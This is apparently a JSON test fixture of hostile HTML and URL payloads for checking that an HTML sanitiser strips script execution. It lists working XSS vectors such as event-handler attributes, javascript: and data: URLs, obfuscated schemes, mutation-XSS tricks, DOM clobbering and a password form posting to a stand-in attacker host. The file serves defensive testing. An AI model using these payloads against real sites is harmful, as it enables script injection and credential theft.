{
  "description": "Hostile HTML payloads for sanitiser tests (spec 10.5). Each payload must come out of the sanitiser with no script execution: no <script>, no on* attributes, no javascript:/data:text/html URLs, no iframe/object/embed/form/base/meta/style, and any target=_blank link must carry rel=noopener noreferrer. 'mustKeep' is text that should survive (the harmless part of the payload).",
  "payloads": [
    { "id": "script-tag", "html": "<script>window.__pwned=1</script><p>safe</p>", "mustKeep": "safe" },
    { "id": "script-uppercase", "html": "<SCRIPT SRC=https://evil.example.test/x.js></SCRIPT>ok", "mustKeep": "ok" },
    { "id": "img-onerror", "html": "<img src=x onerror=window.__pwned=1>text", "mustKeep": "text" },
    { "id": "img-onerror-quoted", "html": "<img src=\"x\" onerror=\"window.__pwned=1\">text", "mustKeep": "text" },
    { "id": "body-onload", "html": "<body onload=window.__pwned=1>text", "mustKeep": "text" },
    { "id": "svg-onload", "html": "<svg onload=window.__pwned=1><circle r=1 /></svg>text", "mustKeep": "text" },
    { "id": "svg-script", "html": "<svg><script>window.__pwned=1</script></svg>text", "mustKeep": "text" },
    { "id": "svg-animate", "html": "<svg><a><animate attributeName=href values=javascript:window.__pwned=1 /><text x=20 y=20>click</text></a></svg>", "mustKeep": "" },
    { "id": "math-xlink", "html": "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:window.__pwned=1\">click</maction></math>", "mustKeep": "" },
    { "id": "href-javascript", "html": "<a href=\"javascript:window.__pwned=1\">link</a>", "mustKeep": "link" },
    { "id": "href-javascript-entity", "html": "<a href=\"&#106;avascript:window.__pwned=1\">link</a>", "mustKeep": "link" },
    { "id": "href-javascript-tab", "html": "<a href=\"java\tscript:window.__pwned=1\">link</a>", "mustKeep": "link" },
    { "id": "href-vbscript", "html": "<a href=\"vbscript:msgbox(1)\">link</a>", "mustKeep": "link" },
    { "id": "href-data-html", "html": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">link</a>", "mustKeep": "link" },
    { "id": "iframe", "html": "<iframe src=\"https://evil.example.test/\"></iframe>text", "mustKeep": "text" },
    { "id": "iframe-srcdoc", "html": "<iframe srcdoc=\"<script>parent.__pwned=1</script>\"></iframe>text", "mustKeep": "text" },
    { "id": "object", "html": "<object data=\"https://evil.example.test/x.swf\"></object>text", "mustKeep": "text" },
    { "id": "embed", "html": "<embed src=\"https://evil.example.test/x.swf\">text", "mustKeep": "text" },
    { "id": "form", "html": "<form action=\"https://evil.example.test/\"><input name=pw type=password><button>Go</button></form>text", "mustKeep": "text" },
    { "id": "formaction", "html": "<button formaction=\"javascript:window.__pwned=1\">x</button>", "mustKeep": "" },
    { "id": "style-tag", "html": "<style>body{display:none}</style>text", "mustKeep": "text" },
    { "id": "style-attr-expression", "html": "<div style=\"width:expression(window.__pwned=1)\">text</div>", "mustKeep": "text" },
    { "id": "style-attr-url", "html": "<div style=\"background:url(javascript:window.__pwned=1)\">text</div>", "mustKeep": "text" },
    { "id": "style-attr-position", "html": "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%\">overlay</div>", "mustKeep": "overlay" },
    { "id": "meta-refresh", "html": "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example.test/\">text", "mustKeep": "text" },
    { "id": "base-href", "html": "<base href=\"https://evil.example.test/\"><a href=\"/relative\">link</a>", "mustKeep": "link" },
    { "id": "link-stylesheet", "html": "<link rel=stylesheet href=\"https://evil.example.test/x.css\">text", "mustKeep": "text" },
    { "id": "target-blank", "html": "<a href=\"https://ok.example.test/\" target=\"_blank\">link</a>", "mustKeep": "link", "expectRel": "noopener noreferrer" },
    { "id": "nested-script-split", "html": "<scr<script>ipt>window.__pwned=1</scr</script>ipt>", "mustKeep": "" },
    { "id": "mutation-xss-noscript", "html": "<noscript><p title=\"</noscript><img src=x onerror=window.__pwned=1>\">", "mustKeep": "" },
    { "id": "mutation-xss-svg-style", "html": "<svg></p><style><a id=\"</style><img src=1 onerror=window.__pwned=1>\">", "mustKeep": "" },
    { "id": "mutation-xss-math-mglyph", "html": "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=1 onerror=window.__pwned=1&gt;\">", "mustKeep": "" },
    { "id": "template", "html": "<template><script>window.__pwned=1</script></template>text", "mustKeep": "text" },
    { "id": "details-ontoggle", "html": "<details open ontoggle=window.__pwned=1>text</details>", "mustKeep": "text" },
    { "id": "video-onerror", "html": "<video><source onerror=\"window.__pwned=1\"></video>text", "mustKeep": "text" },
    { "id": "audio-src-js", "html": "<audio src=\"javascript:window.__pwned=1\" controls></audio>text", "mustKeep": "text" },
    { "id": "img-srcset-js", "html": "<img srcset=\"javascript:window.__pwned=1 1x\">text", "mustKeep": "text" },
    { "id": "dom-clobbering", "html": "<img name=\"getElementById\"><form id=\"x\"><input name=\"attributes\"></form>text", "mustKeep": "text" },
    { "id": "unclosed-tag", "html": "<img src=\"x\" onerror=\"window.__pwned=1\"", "mustKeep": "" },
    { "id": "null-byte", "html": "<scr\u0000ipt>window.__pwned=1</scr\u0000ipt>text", "mustKeep": "text" },
    { "id": "comment-conditional", "html": "<!--[if IE]><script>window.__pwned=1</script><![endif]-->text", "mustKeep": "text" },
    { "id": "cdata-in-html", "html": "<![CDATA[<script>window.__pwned=1</script>]]>text", "mustKeep": "text" },
    { "id": "tracking-pixel", "html": "<img src=\"https://tracker.example.test/pixel.gif\" width=\"1\" height=\"1\">text", "mustKeep": "text", "note": "Not a script risk; sanitiser may keep it, but renderer must set referrerpolicy=no-referrer and loading=lazy." }
  ],
  "urlPayloads": [
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    " javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
    "//evil.example.test/x",
    "ftp://evil.example.test/x"
  ]
}
